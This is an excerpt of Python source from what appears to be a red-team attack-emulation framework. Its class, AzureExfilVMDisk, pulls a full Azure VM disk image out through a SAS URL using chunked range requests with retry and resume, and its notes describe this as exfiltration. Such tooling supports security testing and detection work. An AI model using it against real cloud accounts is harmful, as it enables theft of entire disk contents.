...
class AzureExfilVMDisk(BaseTechnique):
    def __init__(self):
        ...
        technique_notes = [
            ...
            TechniqueNote(
                "Use technique resume capability for dailed large disk downloads"
            ),
            TechniqueNote(
                "Ensure the provide valid SAS URL with at least read permissions for the target disk"
            ),
            TechniqueNote(
                "Exfil data can be extremely large, make sure there is sufficient storage space for the disk image"
            ),
        ]
        technique_refs = [
            TechniqueReference(
        ...
        try:
            ...
            try:
                    ...
                    for block_num in range(current_block, total_blocks):
                        ...
                        while retries < max_retries:
                            try:
                                ...
                                end_byte = min(
                                    start_byte + block_size - 1, total_size - 1
                                )
                                headers = {"Range": f"bytes={start_byte}-{end_byte}"}

                                response = session.get(
                                    sas_url, headers=headers, timeout=download_timeout
                                )
                ...
                return ExecutionStatus.SUCCESS, {
                    "message": "Successfully downloaded VM disk data",
                    "value": {
                        "download_path": download_path,
